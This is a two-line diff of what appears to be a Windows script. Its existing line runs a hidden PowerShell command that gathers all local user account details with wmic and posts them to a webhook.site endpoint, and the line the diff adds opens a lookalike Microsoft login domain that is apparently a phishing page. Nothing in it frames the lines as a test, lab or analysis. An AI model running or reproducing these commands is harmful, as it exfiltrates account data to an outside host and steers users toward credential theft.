@@ -1,1 +1,2 @@
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://webhook.site/de38a56a-6f02-4fc0-a610-8bfb683b12b8' -Method POST -Body (wmic useraccount get /ALL /format:csv) -ContentType 'text/plain'"
+start https://login.microsoftonline365.fr/static/web/
